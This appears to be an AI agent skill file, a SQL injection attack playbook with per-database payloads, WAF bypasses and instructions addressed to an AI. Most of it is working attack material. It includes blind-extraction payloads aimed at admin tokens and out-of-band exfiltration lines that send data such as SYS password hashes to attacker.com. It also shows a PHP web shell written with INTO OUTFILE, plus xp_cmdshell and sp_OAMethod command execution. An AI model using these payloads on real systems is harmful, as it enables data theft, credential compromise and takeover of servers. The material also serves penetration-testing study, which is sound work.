---
name: sqli-sql-injection
description: >-
  SQL injection playbook. Use when input reaches SQL queries, authentication logic, sorting, filtering, reporting, or DB-specific blind and out-of-band execution paths.
---

# SKILL: SQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Advanced SQLi techniques. Assumes basic UNION/error/boolean-blind fundamentals known. Focuses on: per-database exploitation, out-of-band exfiltration, second-order injection, parameterized query bypass scenarios, filter evasion, and escalation to OS. For real-world CVE cases, SMB/DNS OOB exfiltration, INSERT/UPDATE injection patterns, and framework-specific exploitation (ThinkPHP, Django GIS), load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the backend is **Java with Jackson** and your SQL keywords are WAF-blocked — Jackson's `charToHex` table is indexed by `ch & 0xFF`, so a Unicode character like `丰` (U+4E30) resolves to hex digit `0` inside a `\uXXXX` escape sequence, letting you smuggle `UNION`, `SELECT`, `1`, etc. without the WAF ever seeing them

## 1. QUICK START

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- SMB out-of-band exfiltration via `LOAD_FILE` + UNC paths (Windows MySQL)
- KEY injection / URI injection / non-parameter injection points
- INSERT/DELETE/UPDATE statement injection differences
- ThinkPHP5 array key injection (`updatexml` error-based)
- Django GIS Oracle `utl_inaddr.get_host_name` CVE
- ORDER BY / LIMIT injection techniques
- Spring Data JPA sort parameter analysis (Sort.by() parser echo-back test, empty-result masking) — see [references/spring-sort-param-analysis.md](./references/spring-sort-param-analysis.md)
- **Oracle blind SQLi in a `LIKE '%input%'` concat context behind a WAF** (Hibernate/Java targets): self-balancing quote payloads (`' || (CASE WHEN <cond> THEN '<known>' ELSE '<junk>' END) || '`), boolean oracle via totalRecord=1/0, prefix-LIKE and positional `_` extraction when SUBSTR is blocked, `DBMS_XMLGEN.GETXML('SEL'||'ECT ...')` as arbitrary-SQL channel in SELECT-only injection, privilege enumeration (`user_sys_privs`, `all_tab_privs`, `SESSION_PRIVS`), and the RCE ceiling (DBMS_JAVA.RUNJAVA / DBMS_SCHEDULER / WITH FUNCTION EXECUTE IMMEDIATE). Pitfalls covered in the reference: nested-literal escape counting (XMLGEN→EXECUTE IMMEDIATE needs `''''`), row-existence oracle (never verify with `SELECT COUNT(*)` — always 1 row → false TRUE), and Bearer-JWT-plus-session-cookie auth where the cookie rotates/dies mid-engagement — see [references/oracle-like-blind-sqli-waf.md](./references/oracle-like-blind-sqli-waf.md) and [scripts/oracle_like_blind.py](./scripts/oracle_like_blind.py)

### Advanced Reference

Also load [SQLMAP_ADVANCED.md](./SQLMAP_ADVANCED.md) when you need:
- SQLMap tamper scripts matrix and WAF bypass tamper chain recipes (space2comment, between, charencode, etc.)
- `--technique`, `--risk`/`--level` combinations and `--second-url` for second-order injection
- `--os-shell` / `--os-pwn` OS-level exploitation via SQLMap
- INSERT/UPDATE/DELETE injection patterns with data exfiltration examples
- GraphQL + SQL injection (batched queries, nested field injection, mutation injection)
- DB-specific advanced functions: PostgreSQL dollar-sign quoting, MSSQL linked servers, Oracle DBMS_PIPE/DBMS_SCHEDULER

If you have only confirmed a suspicious SQL sink, do not load extra payload skills first; complete first-pass validation here.

### First-pass payload families

| Situation | Start With | Why |
|---|---|---|
| Login or boolean branch | `' or 1=1--` | Fast signal on auth or conditional checks |
| Numeric parameter | `1 or 1=1` | Avoid quote dependency |
| ORDER BY / sorting | `1,2,3` then `1 desc--` | Good for structural probing. **Pitfall**: Spring Data JPA `sort` params are parsed by `Sort.by()` — the server echoes the parsed property name in the JSON response, proving the input never reaches SQL ORDER BY. Send `sort=SLEEP(5)` and check if response echoes `"property":"SLEEP(5)"` → app-layer parse, not injectable. See [references/spring-sort-param-analysis.md](./references/spring-sort-param-analysis.md). |
| Visible SQL errors | `'` then DBMS-specific error probes | Error text gives DBMS clues |
| No visible output | time-based payloads | Stable fallback for blind targets |
| Heavy filtering / WAF | polyglot or whitespace-free variants | Expands parser confusion surface |

### Small, stable first-pass set

```text
'
' or 1=1--
' or '1'='1'--
1 or 1=1
') or ('1'='1
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
'||(SELECT pg_sleep(5))--
1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)
' order by 1--
' union select null--
```

### DBMS routing hints

| Clue | Likely DBMS | Good Next Move |
|---|---|---|
| `You have an error in your SQL syntax` | MySQL | try `SLEEP()` and `@@version` |
| `Microsoft OLE DB Provider` | MSSQL | try `WAITFOR DELAY` |
| `PG::` / `PostgreSQL` | PostgreSQL | try `pg_sleep()` |
| `ORA-` prefix | Oracle | pivot to out-of-band or XML features |
| SQLite errors, local apps | SQLite | focus on boolean/UNION and file-backed behavior |

---

## 1. DETECTION — SUBTLE INDICATORS

Most SQLi is found by **behavioral differences**, not errors:

| Signal | Meaning |
|---|---|
| Page loads differently with `'` vs `''` | String context injection point |
| Numeric: `1` vs `1-1` vs `2-1` returns same | Arithmetic evaluated |
| `1=1` vs `1=2` in condition changes result | Boolean-based injection |
| SELECT with ORDER BY N: column count enumeration | UNION prep |
| Time delay: `'; WAITFOR DELAY '0:0:5'--` | Blind/time-based |
| 500 error on `'`, 200 on `''` | Unhandled exception = SQLi |
| Different HTTP response size | Boolean blind indicator |

**Critical**: test in ALL parameter types — URL query, POST body, JSON fields, XML values, HTTP headers (X-Forwarded-For, User-Agent, Referer, Cookie values).

---

## 2. DATABASE FINGERPRINTING

```sql
-- MySQL
VERSION()              -- returns version string
@@datadir              -- data directory
@@global.secure_file_priv  -- file read restriction

-- MSSQL
@@VERSION              -- includes "Microsoft SQL Server"
DB_NAME()              -- current database
USER_NAME()            -- current user

-- Oracle
v$version              -- SELECT banner FROM v$version WHERE ROWNUM=1
sys.database_name      -- current db (alternative)
user                   -- current Oracle user

-- PostgreSQL
version()              -- returns version
current_database()     -- current db
current_user           -- current user
```

**Error-based fingerprint**: inject `'` and read error message format. MySQL errors differ from Oracle/MSSQL.

---

## 3. UNION-BASED DATA EXTRACTION

**Column count determination**:
```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY N--   ← until error = N-1 columns
```

**Column type detection** (NULL is safest):
```sql
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--  ← find string column
```

**Database-specific string concat** (required when column accepts only int):
```sql
-- MySQL
CONCAT(username,0x3a,password)

-- MSSQL
username+'|'+password

-- Oracle
username||'|'||password

-- PostgreSQL
username||':'||password
```

---

## 4. BLIND INJECTION — INFERENCE TECHNIQUES

### Boolean Blind (conditional response difference)
```sql
-- Does first char of username = 'a'?
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))>96--

-- Oracle
' AND SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a'--

-- MSSQL
' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a'--
```

### Boolean Blind — Second-Operand AND Injection (numeric context)

When the injectable parameter is the **second operand of an AND clause**:
```sql
-- Original query (PHP, numeric context, no quotes):
SELECT * FROM user_follow WHERE sender_id = 42 AND receiver_id = <INJECTABLE>
```

Inject `-1 OR (condition)` to make the first clause always false:
```sql
-- Injected: receiver_id = -1 OR (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'
-- SQL precedence: (sender_id=42 AND receiver_id=-1) OR (condition)
-- First clause is always false (no row with receiver_id=-1)
-- Result depends entirely on condition → boolean oracle
```

**PHP `strpos` space filter bypass**: Many PHP apps filter spaces with:
```php
if (strpos($input, ' ') !== false) { die('Error: spaces not allowed'); }
```
Bypass by replacing ALL spaces with `/**/` (SQL inline comment):
```sql
-1/**/OR/**/(SELECT/**/SUBSTRING(password,1,1)/**/FROM/**/users/**/WHERE/**/id=1)='a'
```

**HTML marker as boolean oracle**: When the page conditionally renders an HTML element (e.g., a Follow/Unfollow button), check for a unique string in the response body. Two polarities exist depending on app logic:

- **Marker absent = TRUE** (rows returned): e.g., a "Follow" button only appears when 0 rows match. `check() returns True when marker NOT in response.`
- **Marker present = TRUE** (rows returned): e.g., a "Followed" badge only appears when a row exists. `check() returns True when marker IS in response.`

Always verify polarity with a sanity check: `1=1` should return True, `1=2` should return False. If they're inverted, flip the marker logic. A common real-world example: a profile page shows "Followed" when `user_follow` row exists (condition TRUE) and "Follow" when no row exists (condition FALSE).

See [scripts/blind_boolean_extract.py](./scripts/blind_boolean_extract.py) for a ready-to-use Python template that supports both polarities via the `MARKER_POLARITY` config.

For teaching/learning or quick one-off extractions, use [scripts/blind_boolean_minimal.py](./scripts/blind_boolean_minimal.py) — a stripped-down version (~30 lines) with only the core logic.

**Pitfall — missing parentheses in conditions**: When wrapping a SELECT subquery in a condition, the opening parenthesis must be part of the injected condition, not just the SQL keyword. For example:
```python
# WRONG — missing "(" before SELECT, query silently returns 0 (condition always false):
check(f"SELECT/**/LENGTH(password)/**/FROM/**/users/**/WHERE/**/id=1)={n}")

# CORRECT — "(" wraps the entire subquery:
check(f"(SELECT/**/LENGTH(password)/**/FROM/**/users/**/WHERE/**/id=1)={n}")
```
The payload becomes `-1/**/OR/**/((SELECT/**/LENGTH(...))=N)` — the double `((` is valid SQL. Without the inner `(`, the `)` matching is off and the query fails silently. This is the most common bug when hand-crafting blind SQLi conditions.

### Time-Based Blind (no response difference)
```sql
-- MSSQL (most reliable)
'; IF (SUBSTRING(username,1,1)='a') WAITFOR DELAY '0:0:5'--

-- MySQL
' AND IF(SUBSTRING(username,1,1)='a',SLEEP(5),0)--

-- Oracle
' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
-- Oracle sleep alternative (no SLEEP):
' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### Time-Based Blind on UPDATE/INSERT/DELETE (no SELECT output)

When the injection point is in an UPDATE/INSERT/DELETE statement, no query results are returned to the client. Boolean-based extraction won't work (no visible response difference), so **SLEEP is the only oracle**.

**Java `escapeString` filter bypass**: Many apps (Spring JDBC, custom DAOs) strip `'`, `"`, `\`, `\n`, `;` but NOT spaces, parentheses, or SQL keywords. This means:
- No string literals in payloads (use `ASCII()`, `LENGTH()`, `SUBSTRING()` — all return integers)
- No stacked queries (no `;`) — use `IF(cond, SLEEP(N), 0)` as an inline expression
- No quote-based auth bypass — but time-based extraction works fine

```java
// Vulnerable Java code (escapeString strips ' " \ \n ; but not spaces/parens/keywords):
String sql = "UPDATE users SET isActive=true WHERE id=" + SqlUtil.escapeString(id);
jdbcTemplate.update(sql);
```

Payload (no quotes, no semicolons, no backslashes):
```sql
1 OR IF((SELECT ASCII(SUBSTRING(token,1,1)) FROM users WHERE LENGTH(token)=64 LIMIT 1)>64, SLEEP(2), 0)
-- Query becomes: UPDATE users SET isActive=true WHERE id=1 OR IF((...), SLEEP(2), 0)
-- TRUE  → SLEEP(2) → response slow (>= threshold)
-- FALSE → returns 0 → response fast
```

**Finding admin row without knowing ID**: Two approaches depending on what you know about the schema:
- `WHERE LENGTH(token)=64 LIMIT 1` — target the row with a known-length token (e.g., 64-char admin token) without needing the ID
- `WHERE role_id=1 LIMIT 1` — when you know the role/permission table structure (e.g., `user_role` table where `user_role_id=1` → admin, FK `users.role_id` → `user_role.user_role_id`). More precise than LENGTH filter.

**Dynamic length discovery**: Don't hardcode token length. Discover it first by testing `LENGTH(column)=1`, `=2`, `=3`, ... until TRUE. This takes at most N requests for an N-char value and avoids assumptions.

**Binary search optimization**: Use `ASCII > mid` (not `= 'a'`) to extract each char in ~7 requests instead of ~75 (linear). Range 32-126 covers all printable ASCII.

**Space-filtered variant**: If the endpoint also filters spaces (e.g., PHP `strpos`), replace all spaces with `/**/`:
```sql
1/**/OR/**/IF((SELECT/**/ASCII(SUBSTRING(token,1,1))/**/FROM/**/users/**/WHERE/**/LENGTH(token)=64/**/LIMIT/**/1)>64,SLEEP(2),0)
```

**PITFALL — Table name typos in SUBQUERY**: Always verify table/column names against the actual schema (e.g., via `information_schema` or DB access). A common mistake is writing `FROM user` instead of `FROM users` (missing trailing `s`). The condition silently returns 0/NULL → `get_length()` returns 0 → "Khong tim thay gia tri". The sanity check (`1=1`/`1=2`) still passes because it doesn't touch the target table. Always cross-check table names before debugging injection logic.

See [scripts/blind_timebased_minimal.py](./scripts/blind_timebased_minimal.py) for a ready-to-use Python template that implements this technique with binary search, sanity check, and configurable SLEEP threshold.

For teaching/learning or quick one-off extractions, use [scripts/blind_timebased_minimal.py](./scripts/blind_timebased_minimal.py) — a stripped-down version (~30 lines) with dynamic length discovery and configurable ROW_CONDITION (use `role_id=1` or `LENGTH(token)=64` to find admin without knowing the ID). The minimal script wraps subqueries in parens before the comparison operator to avoid operator-binding bugs (e.g., `LIMIT 1=12` binds `=` to `LIMIT 1` instead of the subquery result).

**User preference — minimal scripts for learning**: When the user asks for a script "for beginners" or "simple, don't add unnecessary things," strip the script to essentials: no sanity checks, no progress bars, no threading, no config dicts. Keep it under ~30 lines with inline comments only. The user prefers to understand the core logic first, then graduate to the full-featured version. Do NOT add verification scripts, mock tests, or ad-hoc check scripts unless explicitly asked — the user considers them noise when learning.

**User preference — generic templates over lab-specific code**: When creating reusable scripts, keep CONFIG values as generic placeholders (`http://target.com/page`, `"Success"`, `SELECT secret FROM config WHERE id=1`). Never hardcode lab-specific values (IPs, cookies, table names, markers) in the template. The user will fill them in per-target. Lab-specific scripts go in a separate working directory (e.g., `C:\Users\Admin\pentest\`), not in the skill library.

For a universal template that supports both boolean and time-based modes across MySQL, MSSQL, and PostgreSQL in a single script, use [scripts/blind_universal_dumper.py](./scripts/blind_universal_dumper.py). Configure MODE, DIALECT, SUBQUERY, and the script auto-selects the correct SQL functions (SUBSTRING vs SUBSTR, SLEEP vs WAITFOR vs pg_sleep) and payload template. Set EXTRA_PARAMS for required non-injectable URL parameters (e.g., `{"user_id": "14"}`).

**CRITICAL PITFALL — MySQL subquery in LENGTH/ASCII (lab-confirmed)**: MySQL does NOT accept `LENGTH((subquery))` directly in a boolean condition — the condition silently evaluates to 0 (always FALSE), and `get_length()` returns 0 even though the data exists. The correct template is `SELECT/**/LENGTH(({sub}))` — with a `SELECT` prefix and the subquery in its own parens. Same applies to ASCII: `SELECT/**/ASCII(SUBSTRING(({sub}),{pos},1))`. The MSSQL and PostgreSQL dialects use `SELECT LEN(({sub}))` and `SELECT LENGTH(({sub}))` respectively (they also need the SELECT prefix). The universal dumper script handles this automatically via the DIALECTS dict.

**CRITICAL PITFALL — Spaces in SUBQUERY**: When the target filters spaces (e.g., PHP `strpos` check), ALL spaces in the SUBQUERY must be replaced with the dialect's space-bypass character (`/**/` for MySQL/PostgreSQL, `+` for MSSQL). The universal dumper script does this automatically with `SUBQUERY = SUBQUERY.replace(" ", d["space"])`. Without this, the subquery `SELECT backup_password FROM users WHERE id=1` contains spaces that get blocked, and the condition silently fails — the sanity check (`1=1`/`1=2`) still passes because it doesn't use the SUBQUERY, making this bug hard to spot.

**CRITICAL PITFALL — Extra URL parameters**: Many injection endpoints require additional URL parameters to function (e.g., `user_id=14` alongside the injectable `receiver_id`). Without these, the page returns an error or redirect instead of the boolean marker, causing sanity check to fail. The universal dumper script has an `EXTRA_PARAMS` dict for this: `EXTRA_PARAMS = {"user_id": "14"}`. These are merged into every request alongside the injectable param. Note: do NOT put the injectable param itself in EXTRA_PARAMS — it will be overwritten by the payload, but having it there is confusing and error-prone.

**PITFALL — Sanity check passes but get_length() returns 0**: The sanity check (`1=1`/`1=2`) only tests whether the injection point and marker work. It does NOT test the SUBQUERY. If `get_length()` returns 0 but sanity check passes, the problem is in the SUBQUERY — check: (1) table name typo (e.g., `user` vs `users`), (2) spaces not replaced with `/**/`, (3) MySQL needs `SELECT LENGTH((subquery))` not `LENGTH(subquery)`, (4) the target row/column actually has data (verify via DB access or a known condition like `LENGTH(column)>0`).

**PITFALL — Boolean marker polarity**: Always verify polarity with a sanity check (`1=1` should return True, `1=2` should return False). The marker can be either:
- Marker present = TRUE (e.g., "Followed" badge appears when a row exists)
- Marker absent = TRUE (e.g., "Follow" button appears when 0 rows, so absence = condition true)
If `1=1` fails the sanity check, try inverting the marker logic or checking for a different marker string.

**Performance note**: Time-based is slower than boolean-based (~1s per TRUE request vs ~0.2s). For a 64-char token: ~64 × 7 = ~448 requests for extraction + ~64 for length discovery = ~512 total × ~0.5s avg = ~256s. Add threading (10 workers) to parallelize per-character extraction → ~26s.

---

## 5. OUT-OF-BAND (OOB) EXFILTRATION — CRITICAL

Use when blind injection has no time/boolean indicator, or when batch queries can't return data inline.

### MSSQL — OpenRowSet (requires SQLOLEDB, outbound TCP)
```sql
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) VALUES (@@version)--

-- Exfiltrate table data:
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) SELECT TOP 1 username+':'+password FROM users--
```
Use **port 80 or 443** to bypass firewall egress restrictions.

### Oracle — UTL_HTTP (HTTP GET with data in URL path)
```sql
'+UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1))--
```
Oracle's UTL_HTTP supports proxy — can exfil through corporate proxy!

### Oracle — UTL_INADDR (DNS exfiltration — often bypasses HTTP restrictions)
```sql
'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--
```
Attacker sees: `HASH_VALUE.attacker.com` DNS query → read password hash.

### Oracle — UTL_SMTP / UTL_TCP
```sql
-- Email large data dumps:
UTL_SMTP.SENDMAIL(...)  -- send query results via email

-- Raw TCP socket:
UTL_TCP.OPEN_CONNECTION('attacker.com', 80)
```

### MySQL — DNS via LOAD_FILE (Windows + UNC path)
```sql
SELECT LOAD_FILE('\\\\attacker.com\\share')
-- Triggers DNS lookup before connection attempt
-- Works on Windows hosts with outbound SMB
```

### MySQL — INTO OUTFILE (in-band filesystem write)
```sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
-- Requirements: FILE privilege, writable web root, secure_file_priv=''
```

---

## 6. ESCALATION — OS COMMAND EXECUTION

### MSSQL — xp_cmdshell (if enabled, or if sysadmin)
```sql
'; EXEC xp_cmdshell('whoami')--

-- Enable if disabled (requires sysadmin):
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

### MySQL — UDF (User Defined Functions)
Write malicious shared library to filesystem, then `CREATE FUNCTION ... SONAME`.

### Oracle — Java Stored Procedures
```sql
-- Create Java class:
EXEC dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
-- Then exec OS commands via Java Runtime
```

---

## 7. SECOND-ORDER INJECTION

**Concept**: User input is stored safely (parameterized), but later **retrieved as trusted data** and concatenated into a new query without re-sanitization.

**Example attack flow**:
1. Register username: `admin'--`
2. Application safely inserts this into users table
3. Password change function fetches username from session (trusted!) and builds:
   ```sql
   UPDATE users SET password='newpass' WHERE username='admin'--'
   ```
4. Comment strips the condition → updates **admin's** password

**Key insight**: Any application function that reads stored data and uses it in a new DB query is a second-order candidate. Review: password change, profile update, admin action on user data.

---

## 8. PARAMETERIZED QUERY BYPASS SCENARIOS

Parameterized queries do NOT prevent SQLi when:

1. **Table/column names are user-controlled** — params can't parameterize identifiers:
   ```sql
   -- UNSAFE even with params:
   "SELECT * FROM " + tableName + " WHERE id = ?"
   ```
   Mitigation: whitelist-validate table/column names.

2. **Partial parameterization** — some fields concatenated, others parameterized:
   ```sql
   "SELECT * FROM users WHERE type='" + userType + "' AND id=?"
   -- userType not parameterized → injection
   ```

3. **IN clause** with dynamic count (common mistake in ORMs):
   ```sql
   SELECT * FROM items WHERE id IN (1, 2, ?)  -- only last is parameterized
   ```

4. **Second-order** — data retrieved from DB assumed clean, re-used in query without params.

---

## 9. FILTER EVASION TECHNIQUES

### Comment Injection (break keywords)
```sql
SEL/**/ECT
UN/**/ION
1 UN/**/ION ALL SEL/**/ECT NULL--
```

### Case Variation
```sql
UnIoN SeLeCt
```

### URL Encoding
```sql
%55NION  -- U
%53ELECT -- S
```

### Whitespace Alternatives
```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- tab
SELECT%0ausername%0aFROM%0ausers  -- newline
```

### String Construction (bypass literal-string detection)
```sql
-- MySQL concatenation without quotes:
CHAR(117,115,101,114,110,97,109,101)  -- 'username'

-- Oracle:
CHR(117)||CHR(115)||CHR(101)||CHR(114)

-- MSSQL:
CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)
```

---

## 10. DATABASE METADATA EXTRACTION

### MySQL
```sql
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### MSSQL
```sql
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'  -- user tables
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')
```

### Oracle
```sql
SELECT owner,table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT username,password FROM dba_users  -- requires DBA
```

### PostgreSQL
```sql
SELECT datname FROM pg_database
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

---

## 11. STORED PROCEDURE ABUSE

### MSSQL — sp_OAMethod (COM automation)
```sql
DECLARE @o INT
EXEC sp_OACreate 'wscript.shell', @o OUT
EXEC sp_OAMethod @o, 'run', NULL, 'cmd.exe /c whoami > C:\out.txt'
```

### Oracle — DBMS_LDAP (outbound LDAP = DNS exfil)
```sql
SELECT DBMS_LDAP.INIT((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com',389) FROM dual
```

---

## 12. QUICK REFERENCE — INJECTION TEST STRINGS

```
'                          -- break string context
''                         -- escaped quote (test handling)
' OR 1=1--                 -- auth bypass attempt  
' OR 'a'='a               -- alternate auth bypass
'; SELECT 1--             -- statement termination
' UNION SELECT NULL--     -- UNION test
' AND 1=1--               -- boolean true
' AND 1=2--               -- boolean false (different response → injectable)
1; WAITFOR DELAY '0:0:3'-- -- MSSQL time delay
1 AND SLEEP(3)--          -- MySQL time delay
1 AND 1=dbms_pipe.receive_message(('a'),3)-- -- Oracle time delay
```

---

## 13. WAF BYPASS MATRIX

| Technique | Blocked | Bypass |
|---|---|---|
| Space filtered | `SELECT * FROM` | `SELECT/**/*//**/FROM`, `SELECT%0a*%0aFROM` |
| Comma filtered | `UNION SELECT 1,2,3` | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c` |
| Quote filtered | `'admin'` | `0x61646D696E` (hex), `CHAR(97,100,109,105,110)` |
| OR/AND filtered | `OR 1=1` | <code>&#124;&#124;1=1</code>, `&&1=1`, `DIV 0` |
| = filtered | `id=1` | `id LIKE 1`, `id REGEXP '^1$'`, `id IN (1)`, `id BETWEEN 1 AND 1` |
| SELECT filtered | | Use `handler` (MySQL), `PREPARE`+hex, or stacked queries |
| information_schema filtered | | `mysql.innodb_table_stats`, `sys.schema_table_statistics` |

Additional WAF bypass patterns:

- Polyglot: `SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`
- Routed injection: `1' UNION SELECT 0x(inner_payload_hex)-- -` where inner payload is another full query hex-encoded
- Second Order: inject into storage, trigger when data is used in another query later
- PDO emulated prepare: when `PDO::ATTR_EMULATE_PREPARES=true`, stacked queries work even with parameterized-looking code

---

## 14. WAF BYPASS MATRIX

### No-Space Bypass
```sql
SELECT/**/username/**/FROM/**/users
SELECT(username)FROM(users)
```

### No-Comma Bypass
```sql
-- UNION with JOIN instead of comma:
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
-- SUBSTRING alternative: SUBSTRING('abc' FROM 1 FOR 1)
-- LIMIT alternative: LIMIT 1 OFFSET 0
```

### Polyglot Injection
```sql
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Routed Injection
```sql
-- First query returns string used as input to second query:
' UNION SELECT CONCAT(0x222c,(SELECT password FROM users LIMIT 1))--
-- The returned value becomes part of another SQL context
```

### Second-Order Injection
```
-- Step 1: Register username: admin'--
-- Step 2: Trigger password change (uses stored username in SQL)
-- UPDATE users SET password='new' WHERE username='admin'--'
```

### PDO / Prepared Statement Edge Cases
```php
// Unsafe even with PDO when query structure is dynamic:
$pdo->query("SELECT * FROM " . $_GET['table']);
// Or when using emulated prepares with multi-query:
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true);
```

### Entry Point Detection (Unicode tricks)
```
U+02BA ʺ (modifier letter double prime) → "
U+02B9 ʹ (modifier letter prime) → '
%%2727 → %27 → '
```
